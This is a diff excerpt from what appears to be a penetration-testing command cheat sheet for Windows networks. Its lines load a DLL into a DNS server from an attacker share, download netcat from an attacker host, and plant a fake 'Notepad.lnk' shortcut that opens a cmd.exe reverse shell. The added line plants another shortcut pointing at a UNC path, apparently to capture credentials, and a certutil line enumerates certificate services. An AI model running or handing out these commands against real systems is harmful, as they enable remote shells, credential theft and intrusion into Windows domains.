@@ -1461,6 +1461,7 @@ dnscmd.exe /config /serverlevelplugindll \\$MYIP\share\0.dll
 +---------- Malicious .lnk ----------+
 curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
 powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\programdata\nc.exe'; $sc.Arguments = '$TARGET 5566 -e cmd.exe'; $sc.Save()"
+powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; $sc.Arguments = '\\$TARGET\\x'; $sc.Save()"
 
 +---------- Enumerate Certificate Services ----------+
 certutil -ADCA
